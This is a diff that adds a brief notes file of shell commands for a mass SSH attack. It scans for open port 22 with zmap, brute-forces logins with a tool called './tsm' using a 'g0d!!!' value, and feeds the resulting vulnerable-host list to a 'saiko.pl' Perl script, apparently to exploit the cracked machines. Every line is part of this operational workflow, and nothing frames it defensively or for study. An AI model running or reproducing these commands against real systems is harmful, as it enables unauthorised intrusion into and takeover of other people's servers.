@@ -1,0 +1,10 @@
+zmap -p22 -w 3.lst -oi
+
+./tsm -m brute_ip_combo -f 10000000 -p 22 -v 'g0d!!!' -d 2 -r 10000000
+
+better command
+./tsm -m brute_ip_combo_simple -f 2000 -p 22 -v 'g0d!!!' -d 2
+
+rename "r" to vuln.txt
+
+perl saiko.pl vuln.txt
